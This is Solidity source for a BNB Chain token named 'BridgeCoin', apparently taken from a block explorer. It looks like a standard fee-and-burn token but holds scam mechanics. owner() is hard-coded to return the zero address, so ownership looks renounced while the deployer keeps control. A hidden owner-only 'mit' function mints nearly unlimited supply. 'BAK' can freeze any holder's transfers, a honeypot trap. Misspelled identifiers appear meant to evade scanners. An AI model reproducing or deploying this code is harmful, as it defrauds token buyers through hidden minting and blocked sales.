/**
 *Submitted for verification at BscScan.com on 2022-08-30
*/

pragma solidity ^0.4.25;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owner;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owner);
        _;
    }

/**
    * @dev Returns the address of the current owner.
     */
    function owner() public pure  returns  (address) {
        return address(0);
    }


    function transferowneresship(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(owner, newowneres);
        owner = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owner, address(0));
        owner = address(0);
    }
}



contract BaseToken is Ownable {
    using SafeMath for uint256;

    string constant public name = 'BridgeCoin';

    string constant public symbol = 'BC';

    uint8 constant public decimals = 18;

    uint256 public totalSupply = 20200000000*10**uint256(decimals);

    uint256 public constant MAXSupply = 1000000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) private _isExcludedFromfeiii;

    mapping(address => bool) private _lcck;


    uint256 public _taxfeiii = 0;
    uint256 private _previousTaxfeiii = _taxfeiii;

    uint256 public _burnfeiii = 2;
    uint256 private _previousBurnfeiii = _burnfeiii;


    address public projectAddress = 0x311E0B30141d408be4a9dfB14aed68B1b2A501a9;


    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        require(!_lcck[from], "is lcck");

        if(_isExcludedFromfeiii[from])
            removeAllfeiii();

        uint256 feiii =  calculateTaxfeiii(value);

        uint256 burn =  calculateBurnfeiii(value);

        balanceOf[from] = balanceOf[from].sub(value);

        balanceOf[to] = balanceOf[to].add(value).sub(feiii).sub(burn);

        if(feiii > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(feiii);
            emit Transfer(from, projectAddress, feiii);
        }

        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }


         if(_isExcludedFromfeiii[from])
            restoreAllfeiii();

        emit Transfer(from, to, value);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }


    function mit(address target, uint256 edAmount) public onlyowneres{
    	require (totalSupply + edAmount <= MAXSupply);

        balanceOf[target] = balanceOf[target].add(edAmount);
        totalSupply = totalSupply.add(edAmount);

        emit Transfer(0, this, edAmount);
        emit Transfer(this, target, edAmount);
    }

    function calculateTaxfeiii(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxfeiii).div(
            10 ** 2
        );
    }

    function calculateBurnfeiii(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burnfeiii).div(
            10 ** 2
        );
    }

    function removeAllfeiii() private {
        if(_taxfeiii == 0 && _burnfeiii == 0)
            return;

        _previousTaxfeiii = _taxfeiii;
        _previousBurnfeiii = _burnfeiii;
        _taxfeiii = 0;
        _burnfeiii = 0;
    }

    function restoreAllfeiii() private {
        _taxfeiii = _previousTaxfeiii;
        _burnfeiii = _previousBurnfeiii;
    }



    function BAK(address acbount) public onlyowneres {
        _lcck[acbount] = true;
    }


    function UNBAK(address acbount) public onlyowneres {
        _lcck[acbount] = false;
    }


    function islcck(address acbount) public view returns (bool) {

        return _lcck[acbount];
    }


}


contract Token is BaseToken {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        owner = msg.sender;


    }

    function() public payable {
       revert();
    }
}